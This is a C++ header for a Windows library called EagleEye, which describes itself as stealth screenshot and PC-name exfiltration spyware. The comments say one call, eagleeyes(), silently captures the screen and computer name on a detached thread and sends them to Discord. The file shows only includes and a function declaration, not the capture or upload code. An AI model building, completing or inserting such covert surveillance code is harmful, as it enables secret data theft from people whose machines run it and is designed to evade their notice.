// EagleEye — Stealth Screenshot & PC Name Exfiltration Library
// C++17, MSVC, Windows 10/11 x64. Include this header, link eagleeye.lib.
// Call eagleeyes(); from anywhere. It spawns a detached thread, captures the 
// screen and PC name, sends them to Discord, and vanishes.
#pragma once

// WinSock2 MUST be included before windows.h.
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

// Call this function to fire the exfil. Non-blocking, fails silently.
extern "C" void eagleeyes();